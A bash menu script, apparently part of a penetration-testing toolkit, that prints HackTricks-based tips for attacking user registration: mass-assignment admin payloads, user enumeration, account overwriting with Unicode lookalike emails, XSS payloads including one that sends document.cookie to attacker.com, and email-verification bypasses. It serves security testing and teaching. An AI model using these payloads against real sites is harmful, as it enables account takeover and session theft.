#!/bin/bash
# HackTricks Ref: registration-vulnerabilities.md
# Module: User Registration & Signup Vulnerabilities

echo -e "${C6}[WEB ATTACK: REGISTRATION_VULNS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Registration Attack Vector:${NC}"
echo "1) Parameter Pollution / Mass Assignment (Admin Signup)"
echo "2) User Enumeration via Signup"
echo "3) Account Overwriting (Duplicate Username/Email)"
echo "4) XSS in Registration Fields"
echo "5) Weak Verification Logic (Email/SMS Bypass)"
echo "0) Exit"

read -p "Selection: " reg_opt

case $reg_opt in
    1)
        echo -e "\n${C2}[*] Mass Assignment (Over-posting):${NC}"
        echo "Try to add hidden parameters to the POST request during signup:"
        echo " - {\"username\":\"pentester\", \"password\":\"123\", \"role\":\"admin\"}"
        echo " - {\"is_admin\":true, \"can_manage_users\":1}"
        echo " - {\"user[admin]\":\"1\"}"
        ;;
    2)
        echo -e "\n${C2}[*] User Enumeration:${NC}"
        echo "Check if the server response differs for existing vs non-existing emails:"
        echo " - 'Email already in use' vs 'Registration successful'"
        echo " - Timing attacks: Does the server take longer to respond if the user exists?"
        ;;
    3)
        echo -e "\n${C2}[*] Account Overwriting:${NC}"
        echo "1. Register with an existing email: 'admin@target.com'"
        echo "2. Try variations: 'admin@target.com ', ' admin@target.com', 'ADMIN@target.com'"
        echo "3. Use Unicode characters: 'admın@target.com' (Turkish dotless 'i')."
        echo "If the database normalizes the email, you might hijack the existing account."
        ;;
    4)
        echo -e "\n${C2}[*] XSS in Registration:${NC}"
        echo "Inject payloads in fields that will be seen by an Admin in a dashboard:"
        echo " - First Name: <script>fetch('https://attacker.com/'+document.cookie)</script>"
        echo " - Address/Bio: \"><img src=x onerror=alert(1)>"
        ;;
    5)
        echo -e "\n${C2}[*] Verification Bypass:${NC}"
        echo " - Check if you can access /dashboard directly after signup without verifying email."
        echo " - Try to change your email *after* signup to a new one without re-verifying."
        echo " - Intercept the verification request and change 'verified: false' to 'true'."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
